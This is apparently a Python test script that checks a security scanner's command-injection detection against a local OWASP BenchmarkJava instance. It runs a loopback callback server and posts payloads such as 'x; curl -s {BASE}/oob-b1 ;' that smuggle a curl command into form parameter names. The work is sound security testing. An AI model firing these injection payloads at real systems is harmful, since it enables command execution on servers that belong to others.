#!/usr/bin/env python3
"""CM-2 pre-patch LIVE diagnosis (Task 49 design verification, stdlib-only,
zero engine code): the name-channel forms as the parameter NAME (value = the
test's own TCID = the resolver sentinel) against the running BenchmarkJava
8b67a88 stack. Proves per sub-family which form fires BEFORE any engine
patch, per the Section-0.2 discipline."""
import http.server, json, threading, urllib.request, urllib.parse, sys, time

HITS = []
class OAST(http.server.BaseHTTPRequestHandler):
    def log_message(self, *a): pass
    def do_GET(self):
        HITS.append(self.path)
        try: self.send_response(200); self.end_headers(); self.wfile.write(b"ok")
        except Exception: pass

srv = http.server.ThreadingHTTPServer(("127.0.0.1", 0), OAST)
PORT = srv.server_address[1]
threading.Thread(target=srv.serve_forever, daemon=True).start()
BASE = f"http://127.0.0.1:{PORT}"

def probe(tc, chunk, name, value):
    url = f"http://127.0.0.1:8080/benchmark/{chunk}/{tc}"
    body = urllib.parse.urlencode({name: value})
    req = urllib.request.Request(url, data=body.encode(),
        headers={"Content-Type": "application/x-www-form-urlencoded"}, method="POST")
    t0 = HITS[:]
    try:
        r = urllib.request.urlopen(req, timeout=10)
        body_txt = r.read().decode("utf-8", "replace")
        code = r.status
    except urllib.error.HTTPError as e:
        body_txt = e.read().decode("utf-8", "replace"); code = e.code
    time.sleep(0.4)  # callback settle
    new = [h for h in HITS if h not in t0]
    return code, new, body_txt

CASES = [
    # (label, tc, chunk, name, value)
    ("00573 envp  NC-TWIN-ENV",  "BenchmarkTest00573", "cmdi-00",
     f"FOO=curl -s {BASE}/oob-a1 ;", "BenchmarkTest00573"),
    ("00573 envp  VALUE-CONTROL (dead expected)", "BenchmarkTest00573", "cmdi-00",
     "BenchmarkTest00573", f"FOO=curl -s {BASE}/oob-a2 ;"),
    ("00568 shell NC-VARIANT",   "BenchmarkTest00568", "cmdi-00",
     f"x; curl -s {BASE}/oob-b1 ;", "BenchmarkTest00568"),
    ("01430 shell NC-VARIANT",   "BenchmarkTest01430", "cmdi-01",
     f"x; curl -s {BASE}/oob-c1 ;", "BenchmarkTest01430"),
    ("00567 echo  NC-VARIANT (OOB dead expected)", "BenchmarkTest00567", "cmdi-00",
     f"x; curl -s {BASE}/oob-d1 ;", "BenchmarkTest00567"),
    ("00567 echo  NC-MARKER (reflection expected)", "BenchmarkTest00567", "cmdi-00",
     "sentinelargvmark1", "BenchmarkTest00567"),
    ("00575 echo  NC-MARKER (reflection expected)", "BenchmarkTest00575", "cmdi-00",
     "sentinelargvmark1", "BenchmarkTest00575"),
    ("01441 shell NC-VARIANT",   "BenchmarkTest01441", "cmdi-01",
     f"x; curl -s {BASE}/oob-e1 ;", "BenchmarkTest01441"),
    ("02344 envp  NC-TWIN-ENV",  "BenchmarkTest02344", "cmdi-03",
     f"FOO=curl -s {BASE}/oob-f1 ;", "BenchmarkTest02344"),
    ("02333 direct-ish NC-VARIANT", "BenchmarkTest02333", "cmdi-02",
     f"x; curl -s {BASE}/oob-g1 ;", "BenchmarkTest02333"),
]
print(f"OAST on 127.0.0.1:{PORT}")
for label, tc, chunk, name, value in CASES:
    code, new, body = probe(tc, chunk, name, value)
    marker_in_body = "sentinelargvmark1" in body
    print(f"[{label}] HTTP {code} oob_hits={new or 'NONE'}"
          + (" MARKER_REFLECTED" if marker_in_body else "")
          + (f" body[:90]={body[:90]!r}" if "00567" in label or "00575" in label else ""))
print("ALL HITS:", HITS)
srv.shutdown()
